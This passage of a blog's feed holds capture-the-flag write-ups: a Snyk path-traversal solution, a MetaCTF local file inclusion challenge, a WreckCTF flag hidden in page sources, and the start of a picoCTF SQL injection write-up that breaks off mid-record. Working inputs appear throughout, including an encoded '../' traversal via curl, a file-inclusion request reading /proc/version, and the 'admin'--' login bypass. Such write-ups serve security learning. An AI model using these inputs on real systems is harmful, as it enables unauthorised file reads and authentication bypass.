<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/    
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of &lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;bin/&#34;</span>&gt;bin/&lt;/a&gt;         2019-05-08T01:41:31.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;boot/&#34;</span>&gt;boot/&lt;/a&gt;        2019-03-28T09:12:44.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;dev/&#34;</span>&gt;dev/&lt;/a&gt;         2022-11-09T11:51:50.758Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;etc/&#34;</span>&gt;etc/&lt;/a&gt;         2022-11-09T11:51:47.531Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;home/&#34;</span>&gt;home/&lt;/a&gt;        2019-05-08T02:14:27.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;lib/&#34;</span>&gt;lib/&lt;/a&gt;         2019-05-08T01:41:44.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;lib64/&#34;</span>&gt;lib64/&lt;/a&gt;       2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;media/&#34;</span>&gt;media/&lt;/a&gt;       2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;mnt/&#34;</span>&gt;mnt/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;opt/&#34;</span>&gt;opt/&lt;/a&gt;         2019-05-08T02:17:53.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;proc/&#34;</span>&gt;proc/&lt;/a&gt;        2022-11-09T11:51:50.747Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;root/&#34;</span>&gt;root/&lt;/a&gt;        2022-09-22T07:15:14.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;run/&#34;</span>&gt;run/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;sbin/&#34;</span>&gt;sbin/&lt;/a&gt;        2019-05-08T01:40:28.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;srv/&#34;</span>&gt;srv/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;sys/&#34;</span>&gt;sys/&lt;/a&gt;         2022-11-09T11:48:47.826Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;tmp/&#34;</span>&gt;tmp/&lt;/a&gt;         2022-09-22T07:15:14.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;usr/&#34;</span>&gt;usr/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;var/&#34;</span>&gt;var/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>After searching for a  while I found the source code of the program and found the flag.</p>
<p>It turns out that the source code for the program is located in <code>/usr/src/goof</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/usr/src/  
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of &lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;goof/&#34;</span>&gt;goof/&lt;/a&gt;       2022-09-22T07:15:25.000Z       -
</span></span><span class="line"><span class="cl">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let’s see what is inside that folder:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/usr/src/goof/
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of &lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;node_modules/&#34;</span>&gt;node_modules/&lt;/a&gt;            2022-09-22T07:15:28.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;public/&#34;</span>&gt;public/&lt;/a&gt;                  2022-09-22T07:13:46.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;routes/&#34;</span>&gt;routes/&lt;/a&gt;                  2022-09-22T07:13:46.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;views/&#34;</span>&gt;views/&lt;/a&gt;                   2022-09-22T07:13:46.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;app.js&#34;</span>&gt;app.js&lt;/a&gt;                   2022-09-22T07:13:46.000Z         <span class="m">502</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;app.json&#34;</span>&gt;app.json&lt;/a&gt;                 2022-09-22T07:13:46.000Z         <span class="m">267</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;build-tag-push.sh&#34;</span>&gt;build-tag-push.sh&lt;/a&gt;        2022-09-22T07:13:46.000Z         <span class="m">206</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;challenge.yml&#34;</span>&gt;challenge.yml&lt;/a&gt;            2022-09-22T07:13:46.000Z        <span class="m">1261</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;docker-compose.yml&#34;</span>&gt;docker-compose.yml&lt;/a&gt;       2022-09-22T07:13:46.000Z         <span class="m">155</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;Dockerfile&#34;</span>&gt;Dockerfile&lt;/a&gt;               2022-09-22T07:13:46.000Z         <span class="m">203</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span>&gt;flag&lt;/a&gt;                     2022-09-22T07:13:46.000Z          <span class="m">72</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;index.html&#34;</span>&gt;index.html&lt;/a&gt;               2022-09-22T07:13:46.000Z         <span class="m">182</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;package-lock.json&#34;</span>&gt;package-lock.json&lt;/a&gt;        2022-09-22T07:13:46.000Z       <span class="m">34853</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;package.json&#34;</span>&gt;package.json&lt;/a&gt;             2022-09-22T07:13:46.000Z         <span class="m">518</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;README.md&#34;</span>&gt;README.md&lt;/a&gt;                2022-09-22T07:13:46.000Z          <span class="m">28</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;test.py&#34;</span>&gt;test.py&lt;/a&gt;                  2022-09-22T07:13:46.000Z         <span class="m">603</span>
</span></span><span class="line"><span class="cl">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is the flag!</p>
<p>It’s located in <code>/usr/src/goof/flag</code></p>
<p>Let’s retrieve the flag using curl</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/usr/src/goof/flag
</span></span><span class="line"><span class="cl">SNYK<span class="o">{</span>6854ecb17f23afdf2610f741dd07bd6099c616e4ac2a403eb14fa8689e1fb0af<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>found the flag:</p>
<p><code>SNYK{6854ecb17f23afdf2610f741dd07bd6099c616e4ac2a403eb14fa8689e1fb0af}</code></p>
]]></description></item><item><title>Technovate2022 - Forensics - Trail Blazer</title><link>https://blog.ppeinecke.de/posts/technovate2022-forensics-trail-blazer/</link><pubDate>Sun, 04 Dec 2022 23:39:42 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/technovate2022-forensics-trail-blazer/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/technovate2022.jpg" referrerpolicy="no-referrer">
            </div><h1 id="trail-blazer">Trail Blazer</h1>
<h2 id="description">description</h2>
<p>I just made <a href="http://host3.metaproblems.com:4110/" target="_blank" rel="noopener noreffer">this cool website</a> that acts as your own personal web browser!</p>
<p>Why is this cool? Well&hellip; I wrote it! Anyway, check it out and let me know if there are any
features you would like to see added!</p>
<p><strong>Hint: You just need to search for /flag.txt.</strong></p>
<h2 id="writeup">writeup</h2>
<p>upon opening the website in my browser i am presented with the following form:</p>
<p></p>
<p>If i try to input any url e.g. <a href="http://google.com" target="_blank" rel="noopener noreffer">google.com</a> I get redirected to this page: <a href="http://host3.metaproblems.com:4110/blaze.php?page=google.com" target="_blank" rel="noopener noreffer"><code>http://host3.metaproblems.com:4110/blaze.php?page=google.com</code></a></p>
<p>But I get an error:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Could not open file.
</span></span></code></pre></td></tr></table>
</div>
</div><p>So it looks like the program is including an actual single file.</p>
<p>Let’s try something like: <code>/proc/version</code></p>
<p>The GET request would look like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://host3.metaproblems.com:4110/blaze.php?page=/proc/version
</span></span></code></pre></td></tr></table>
</div>
</div><p>And I get the following response:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Linux version 4.19.0-22-cloud-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.260-1 (2022-09-29)
</span></span></code></pre></td></tr></table>
</div>
</div><p>So that confirms that the LFI technique is in fact working.</p>
<p>Since the hint for this challenge says: <strong>You just need to search for /flag.txt</strong></p>
<p>We can just get the flag like so:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://host3.metaproblems.com:4110/blaze.php?page<span class="o">=</span>/flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MetaCTF<span class="o">{</span>blazing_paths_will_blaze_your_app_t00<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>WRECKCTF_2022 - web - sources</title><link>https://blog.ppeinecke.de/posts/wreckctf-2022-web-sources/</link><pubDate>Sat, 01 Oct 2022 18:57:31 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/wreckctf-2022-web-sources/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/wreckctf_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="wreckctf_2022---web---sources---writeup">WreckCTF_2022 - web - sources - writeup</h1>
<h2 id="description">description</h2>
<p>click to spin, search for the flag!</p>
<p>sources.challs.wreckctf.com</p>
<h2 id="writeup">writeup</h2>
<p>After going to the link <code>https://sources.challs.wreckctf.com/</code> I can get the first part of the flag by looking at the HTML code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!doctype html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;style.css&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;script.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;image.png&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- flag part 1: flag{bd6a9e3f --&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first part of our flag is <code>flag{bd6a9e3f</code></p>
<p>After looking at the file <code>https://sources.challs.wreckctf.com/style.css</code>
I get the second part of the flag!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">html</span><span class="o">,</span> <span class="nt">body</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">height</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">body</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">display</span><span class="p">:</span> <span class="k">grid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">place-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">img</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">height</span><span class="p">:</span> <span class="mi">30</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">user-select</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">div</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">position</span><span class="p">:</span> <span class="kc">absolute</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">height</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">/* flag part 2: 1690f7ab */</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the second part of the flag is <code>1690f7ab</code></p>
<p>By looking at the file <code>https://sources.challs.wreckctf.com/script.js</code> I found the third part of the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(</span><span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="nx">res</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">state</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">velocity</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">angle</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">time</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">element</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">animate</span> <span class="o">=</span> <span class="p">(</span><span class="nx">current</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">time</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="nx">state</span><span class="p">.</span><span class="nx">time</span> <span class="o">=</span> <span class="nx">current</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">delta</span> <span class="o">=</span> <span class="nx">current</span> <span class="o">-</span> <span class="nx">state</span><span class="p">.</span><span class="nx">time</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span><span class="p">.</span><span class="nx">angle</span> <span class="o">=</span> <span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">angle</span> <span class="o">+</span> <span class="nx">state</span><span class="p">.</span><span class="nx">velocity</span> <span class="o">*</span> <span class="nx">delta</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">)</span> <span class="o">%</span> <span class="mi">360</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">element</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">transform</span> <span class="o">=</span> <span class="sb">`rotate(</span><span class="si">${</span><span class="nx">state</span><span class="p">.</span><span class="nx">angle</span><span class="si">}</span><span class="sb">deg)`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">state</span><span class="p">.</span><span class="nx">time</span> <span class="o">=</span> <span class="nx">current</span>
</span></span><span class="line"><span class="cl">        <span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">animate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">animate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span><span class="p">.</span><span class="nx">velocity</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">setInterval</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span><span class="p">.</span><span class="nx">velocity</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">state</span><span class="p">.</span><span class="nx">velocity</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">})()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// flag part 3: b8445c0e}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>So the third part of the flag is <code>b8445c0e}</code>.</p>
<p>After piecing it together the final flag is: <code>flag{bd6a9e3f1690f7abb8445c0e}</code></p>
]]></description></item><item><title>picoCTF - Web Exploitation - SQLiLite</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sqlilite/</link><pubDate>Wed, 06 Apr 2022 16:12:40 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sqlilite/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---sqlilite---writeup">Web Exploitation - SQLiLite - writeup</h1>
<h2 id="description">description</h2>
<p>Can you login to this website?</p>
<p>Try to login <!-- raw HTML omitted -->here<!-- raw HTML omitted -->.</p>
<h2 id="writeup">writeup</h2>
<p>Once i visit the website <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:60431/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:60431/</a><!-- raw HTML omitted -->
in firefox I can see a login form with a username and a password field.</p>
<p>My first attempt was to use the username &lsquo;admin&rsquo;
and try a basic sql injection.</p>
<p>So I input in the username field this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39;--
</span></span></code></pre></td></tr></table>
</div>
</div><p>the single quote is here to end the input of the text box.</p>
<p>The double dash (&ndash;) is here to comment out the rest of the sql query
so we can skip the password check.</p>
<p>Once I try to login using this method I get redirected to a page with the following content:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: admin&#39;--
</span></span><span class="line"><span class="cl">password: 
